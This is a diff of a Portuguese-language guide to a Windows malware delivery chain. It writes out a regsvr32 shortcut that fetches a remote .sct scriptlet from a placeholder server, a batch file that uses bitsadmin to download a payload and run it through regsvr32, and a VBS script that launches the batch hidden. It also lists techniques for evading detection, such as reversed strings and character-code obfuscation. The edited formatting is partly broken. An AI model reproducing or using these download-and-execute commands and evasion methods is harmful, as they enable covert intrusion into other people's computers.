@@ -18,12 +18,9 @@ O ponto de entrada é um atalho do Windows com as seguintes propriedades:
 Destino: %windir%\System32\regsvr32.exe
 Argumentos: /s /u /i:http://[ip-servidor]/[nome-script].sct scrobj.dll
 Ícone: %SystemRoot%\System32\devmgr.dll,0
-Estilo da Janela: Minimizada
+````
 
-O arquivo SCT (Scriptlet) contém código JScript ofuscado com múltiplas técnicas de evasão.
-
-2. Técnica baseada em BITS Admin (mais confiável)
-Um método alternativo que oferece maior confiabilidade em ambientes protegidos:
+###O arquivo SCT (Scriptlet) contém código JScript ofuscado com múltiplas técnicas de evasão.
 
 Execução via script BAT e VBS
 ### Criar arquivo batch
@@ -33,11 +30,10 @@ bitsadmin /transfer myDownloadJob /download /priority high http://[ip-servidor]/
 regsvr32 /s /u /i:"%TEMP%\data.tmp" scrobj.dll
 exit
 
-Criar script VBS para execução oculta
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "cmd.exe /c ""%TEMP%\config.bat""", 0, False
 
-3. Técnicas de Evasão
+###3. Técnicas de Evasão
 A implementação usa múltiplas camadas de evasão:
 
 Inversão de Strings: Strings como "powershell.exe" são armazenadas invertidas
@@ -45,8 +41,6 @@ Inversão de Strings: Strings como "powershell.exe" são armazenadas invertidas
 Conversão de Código de Caracteres: Strings críticas construídas a partir de códigos ASCII
 
 Expansão de Variáveis de Ambiente: Construção dinâmica de caminhos do sistema
-
-Execução Oculta: Agora via VBS, evitando janelas do CMD
 
 Uso de Serviços Legítimos: BITS é um componente do Windows usado para Windows Update
 
@@ -103,5 +97,3 @@ Comandos fragmentados e ofuscados previnem detecção
 A execução ocorre totalmente em segundo plano sem janelas visíveis
 
 Utiliza métodos de transferência legítimos usados pelo próprio Windows
-
-
